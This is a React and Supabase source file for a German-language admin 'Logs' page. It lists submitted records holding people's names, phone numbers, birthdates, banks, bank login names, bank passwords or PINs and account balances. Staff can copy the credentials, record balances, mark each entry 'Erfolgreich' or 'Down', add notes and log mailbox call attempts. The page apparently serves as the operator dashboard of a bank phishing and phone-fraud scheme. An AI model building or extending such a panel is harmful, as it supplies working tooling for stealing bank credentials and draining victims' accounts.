import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import AdminLayout, { useAdminUser } from "@/components/AdminLayout";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
import { toast } from "sonner";
import { Copy, Eye, MessageSquare, PhoneMissed, RefreshCw } from "lucide-react";
import { useSubmissions, type Note } from "@/hooks/use-submissions";
import { useQueryClient } from "@tanstack/react-query";

interface Call {
  id: string;
  user_email: string;
  call_type: string;
  created_at: string;
}

const STATUS_OPTIONS = ["Neu", "In Bearbeitung", "Erfolgreich", "Down"] as const;

const statusBadgeClass: Record<string, string> = {
  "Neu": "bg-slate-100 text-slate-700 hover:bg-slate-100",
  "In Bearbeitung": "bg-blue-50 text-blue-700 hover:bg-blue-50",
  "Erfolgreich": "bg-emerald-50 text-emerald-700 hover:bg-emerald-50",
  "Down": "bg-red-50 text-red-700 hover:bg-red-50",
};

function LogsContent() {
  const navigate = useNavigate();
  const user = useAdminUser();
  const queryClient = useQueryClient();
  const { submissions, noteCounts, callCounts, refetch } = useSubmissions();
  const [balanceEdit, setBalanceEdit] = useState<{ id: string; value: string } | null>(null);
  const [statusFilter, setStatusFilter] = useState<string>("Alle");
  const [noteDialog, setNoteDialog] = useState<{ id: string; notes: Note[] } | null>(null);
  const [callDialog, setCallDialog] = useState<{ id: string; calls: Call[] } | null>(null);
  const [newNote, setNewNote] = useState("");
  const [savingNote, setSavingNote] = useState(false);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Kopiert!");
  };

  const saveBalance = async () => {
    if (!balanceEdit) return;
    const { error } = await supabase.from("submissions").update({ balance: balanceEdit.value || null }).eq("id", balanceEdit.id);
    if (error) { toast.error("Fehler beim Speichern"); }
    else {
      toast.success("Guthaben gespeichert");
      queryClient.setQueryData<any[]>(["submissions"], (old) =>
        old?.map((s) => (s.id === balanceEdit.id ? { ...s, balance: balanceEdit.value || null } : s))
      );
      setBalanceEdit(null);
    }
  };

  const updateStatus = async (id: string, status: string) => {
    const { error } = await supabase.from("submissions").update({ status }).eq("id", id);
    if (error) { toast.error("Fehler beim Speichern"); }
    else {
      queryClient.setQueryData<any[]>(["submissions"], (old) =>
        old?.map((s) => (s.id === id ? { ...s, status } : s))
      );
    }
  };

  const openNoteDialog = async (subId: string) => {
    const { data } = await supabase.from("submission_notes").select("*").eq("submission_id", subId).order("created_at", { ascending: false });
    setNoteDialog({ id: subId, notes: (data || []) as Note[] });
    setNewNote("");
  };

  const addNote = async () => {
    if (!noteDialog || !user || !newNote.trim()) return;
    setSavingNote(true);
    const { data, error } = await supabase.from("submission_notes").insert({
      submission_id: noteDialog.id,
      user_id: user.id,
      user_email: user.email || "unknown",
      content: newNote.trim(),
    }).select().single();
    setSavingNote(false);
    if (error) { toast.error("Fehler beim Speichern"); }
    else {
      setNewNote("");
      if (data) {
        setNoteDialog((prev) => prev ? { ...prev, notes: [data as Note, ...prev.notes] } : null);
        queryClient.invalidateQueries({ queryKey: ["submission-note-counts"] });
      }
    }
  };

  const addMailboxCall = async (subId: string) => {
    if (!user) return;
    const { error } = await supabase.from("submission_calls").insert({
      submission_id: subId,
      user_id: user.id,
      user_email: user.email || "unknown",
      call_type: "mailbox",
    });
    if (error) { toast.error("Fehler beim Speichern"); }
    else {
      toast.success("Mailbox-Versuch gespeichert");
      queryClient.invalidateQueries({ queryKey: ["submission-call-counts"] });
    }
  };

  const openCallDialog = async (subId: string) => {
    const { data } = await supabase.from("submission_calls").select("*").eq("submission_id", subId).order("created_at", { ascending: false });
    setCallDialog({ id: subId, calls: (data || []) as Call[] });
  };

  const CopyCell = ({ value }: { value: string | null }) => {
    if (!value) return <span className="text-slate-400">-</span>;
    return (
      <button onClick={() => copyToClipboard(value)} className="flex items-center gap-1 text-sm text-slate-700 hover:text-blue-600 transition-colors">
        {value} <Copy className="h-3 w-3 opacity-40" />
      </button>
    );
  };

  const filteredSubmissions = statusFilter === "Alle"
    ? submissions
    : submissions.filter((s) => (s.status || "Neu") === statusFilter);

  return (
    <TooltipProvider>
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold text-slate-900">Logs</h1>
        <Button variant="outline" size="sm" onClick={refetch} className="gap-2">
          <RefreshCw className="h-3.5 w-3.5" /> Aktualisieren
        </Button>
      </div>

      <div className="flex items-center gap-2">
        {["Alle", ...STATUS_OPTIONS].map((s) => (
          <button
            key={s}
            onClick={() => setStatusFilter(s)}
            className={`rounded-full px-3.5 py-1.5 text-xs font-medium transition-colors ${
              statusFilter === s
                ? "bg-slate-900 text-white"
                : "bg-white text-slate-600 border border-slate-200 hover:bg-slate-50"
            }`}
          >
            {s}
          </button>
        ))}
      </div>

      <div className="rounded-xl border border-slate-200 bg-white shadow-sm overflow-x-auto">
        <Table>
          <TableHeader>
            <TableRow className="bg-slate-50/50">
              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Zeitpunkt</TableHead>
              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Name</TableHead>
              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Telefon</TableHead>
              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Geburtsdatum</TableHead>
              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Stadt</TableHead>
              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Bank</TableHead>
              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Login-Name</TableHead>
              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Passwort/PIN</TableHead>
              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Guthaben</TableHead>
              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Status</TableHead>
              <TableHead className="text-xs font-semibold text-slate-500 uppercase tracking-wider">Aktionen</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {filteredSubmissions.map((sub) => {
              const currentStatus = sub.status || "Neu";
              const nc = noteCounts[sub.id] || 0;
              const cc = callCounts[sub.id] || 0;
              return (
                <TableRow key={sub.id} className="hover:bg-slate-50/50 transition-colors">
                  <TableCell className="whitespace-nowrap text-xs text-slate-500">
                    {sub.created_at ? new Date(sub.created_at).toLocaleString("de-AT") : "-"}
                  </TableCell>
                  <TableCell className="font-medium text-slate-800">{sub.full_name || "-"}</TableCell>
                  <TableCell><CopyCell value={sub.phone} /></TableCell>
                  <TableCell className="text-sm text-slate-600">{sub.birthdate || "-"}</TableCell>
                  <TableCell className="text-sm text-slate-600">{sub.city || "-"}</TableCell>
                  <TableCell className="text-sm text-slate-600">{sub.bank || "-"}</TableCell>
                  <TableCell><CopyCell value={sub.bank_username} /></TableCell>
                  <TableCell><CopyCell value={sub.bank_password} /></TableCell>
                  <TableCell>
                    <button
                      onClick={() => setBalanceEdit({ id: sub.id, value: sub.balance || "" })}
                      className="text-sm text-slate-600 hover:text-blue-600 cursor-pointer transition-colors"
                    >
                      {sub.balance || "-"}
                    </button>
                  </TableCell>
                  <TableCell>
                    <Select value={currentStatus} onValueChange={(val) => updateStatus(sub.id, val)}>
                      <SelectTrigger className="h-7 w-[130px] border-0 p-0 shadow-none">
                        <Badge className={`text-xs font-medium ${statusBadgeClass[currentStatus] || ""}`}>{currentStatus}</Badge>
                      </SelectTrigger>
                      <SelectContent>
                        {STATUS_OPTIONS.map((opt) => (
                          <SelectItem key={opt} value={opt}>{opt}</SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </TableCell>
                  <TableCell>
                    <div className="flex items-center gap-0.5">
                      <Tooltip>
                        <TooltipTrigger asChild>
                          <Button size="icon" variant="ghost" className="h-8 w-8 text-slate-400 hover:text-slate-700" onClick={() => navigate(`/admin/logs/${sub.id}`)}>
                            <Eye className="h-4 w-4" />
                          </Button>
                        </TooltipTrigger>
                        <TooltipContent>Details</TooltipContent>
                      </Tooltip>
                      <div className="relative">
                        <Tooltip>
                          <TooltipTrigger asChild>
                            <Button size="icon" variant="ghost" className="h-8 w-8 text-slate-400 hover:text-slate-700" onClick={() => openNoteDialog(sub.id)}>
                              <MessageSquare className="h-4 w-4" />
                            </Button>
                          </TooltipTrigger>
                          <TooltipContent>Notizen</TooltipContent>
                        </Tooltip>
                        {nc > 0 && (
                          <button onClick={() => openNoteDialog(sub.id)} className="absolute -top-1 -right-1 flex h-4 min-w-4 items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold text-white">
                            {nc}
                          </button>
                        )}
                      </div>
                      <div className="relative">
                        <Tooltip>
                          <TooltipTrigger asChild>
                            <Button size="icon" variant="ghost" className="h-8 w-8 text-slate-400 hover:text-slate-700" onClick={() => addMailboxCall(sub.id)}>
                              <PhoneMissed className="h-4 w-4" />
                            </Button>
                          </TooltipTrigger>
                          <TooltipContent>Mailbox</TooltipContent>
                        </Tooltip>
                        {cc > 0 && (
                          <button onClick={() => openCallDialog(sub.id)} className="absolute -top-1 -right-1 flex h-4 min-w-4 items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold text-white">
                            {cc}
                          </button>
                        )}
                      </div>
                    </div>
                  </TableCell>
                </TableRow>
              );
            })}
            {filteredSubmissions.length === 0 && (
              <TableRow>
                <TableCell colSpan={11} className="text-center text-slate-400 py-12">
                  Keine Einträge vorhanden
                </TableCell>
              </TableRow>
            )}
          </TableBody>
        </Table>
      </div>

      {/* Balance Edit Dialog */}
      <Dialog open={!!balanceEdit} onOpenChange={(open) => !open && setBalanceEdit(null)}>
        <DialogContent className="max-w-sm">
          <DialogHeader><DialogTitle>Guthaben bearbeiten</DialogTitle></DialogHeader>
          <div className="space-y-4">
            <Input
              placeholder="z.B. 1.250,00 €"
              value={balanceEdit?.value || ""}
              onChange={(e) => setBalanceEdit((prev) => prev ? { ...prev, value: e.target.value } : null)}
              onKeyDown={(e) => e.key === "Enter" && saveBalance()}
            />
            <div className="flex justify-end gap-2">
              <Button variant="outline" size="sm" onClick={() => setBalanceEdit(null)}>Abbrechen</Button>
              <Button size="sm" onClick={saveBalance}>Speichern</Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Notes Dialog */}
      <Dialog open={!!noteDialog} onOpenChange={(open) => !open && setNoteDialog(null)}>
        <DialogContent className="max-w-lg">
          <DialogHeader><DialogTitle>Notizen</DialogTitle></DialogHeader>
          <div className="space-y-4">
            <div className="space-y-2">
              <Textarea placeholder="Neue Notiz schreiben..." value={newNote} onChange={(e) => setNewNote(e.target.value)} rows={3} />
              <Button size="sm" onClick={addNote} disabled={savingNote || !newNote.trim()}>Notiz hinzufügen</Button>
            </div>
            {noteDialog && noteDialog.notes.length > 0 ? (
              <div className="space-y-3 max-h-64 overflow-y-auto">
                {noteDialog.notes.map((note) => (
                  <div key={note.id} className="rounded-lg border border-slate-200 p-3 text-sm bg-slate-50">
                    <div className="flex justify-between text-xs text-slate-400 mb-1">
                      <span>{note.user_email}</span>
                      <span>{new Date(note.created_at).toLocaleString("de-AT")}</span>
                    </div>
                    <p className="text-slate-700 whitespace-pre-wrap">{note.content}</p>
                  </div>
                ))}
              </div>
            ) : (
              <p className="text-sm text-slate-400">Keine Notizen vorhanden</p>
            )}
          </div>
        </DialogContent>
      </Dialog>

      {/* Call/Mailbox Dialog */}
      <Dialog open={!!callDialog} onOpenChange={(open) => !open && setCallDialog(null)}>
        <DialogContent className="max-w-sm">
          <DialogHeader><DialogTitle>Mailbox-Versuche</DialogTitle></DialogHeader>
          {callDialog && callDialog.calls.length > 0 ? (
            <div className="space-y-2 max-h-64 overflow-y-auto">
              {callDialog.calls.map((call) => (
                <div key={call.id} className="flex justify-between rounded-lg border border-slate-200 p-2.5 text-sm bg-slate-50">
                  <span className="text-slate-600">Mailbox</span>
                  <span className="text-xs text-slate-400">{new Date(call.created_at).toLocaleString("de-AT")}</span>
                </div>
              ))}
            </div>
          ) : (
            <p className="text-sm text-slate-400">Keine Versuche</p>
          )}
        </DialogContent>
      </Dialog>
    </div>
    </TooltipProvider>
  );
}

const AdminLogs = () => (
  <AdminLayout>
    <LogsContent />
  </AdminLayout>
);

export default AdminLogs;
